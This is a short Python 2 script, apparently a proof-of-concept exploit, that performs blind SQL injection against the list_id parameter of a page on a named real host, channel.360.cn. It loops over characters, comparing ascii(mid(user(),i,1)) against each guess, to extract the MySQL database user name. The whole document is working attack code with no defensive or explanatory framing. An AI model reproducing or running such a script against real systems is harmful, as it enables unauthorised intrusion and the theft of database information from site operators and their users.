#encoding=utf-8

import httplib

import time

import string

import sys

import random

import urllib





headers = {}

payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')



print 'Start to retrive MySQL User:'

user = ''

for i in range(1,25):

    for payload in payloads:

        conn = httplib.HTTPConnection('channel.360.cn', timeout=60)

        s = "/frontnotice/list?list_id=1 and ascii(mid(user(),%s,1))=%s" % (i, ord(payload))

        conn.request(method='GET',

                     url=s,

                     headers=headers)

        html_doc = conn.getresponse().read().decode('utf-8')

        conn.close()

        if html_doc.find(u'违规渠道封包功能上线') > 0:

            user += payload

            print '\n[Scan in progress]' + user

            break

        else:

            print '.',



print '\n[Done]MySQL user is ' + user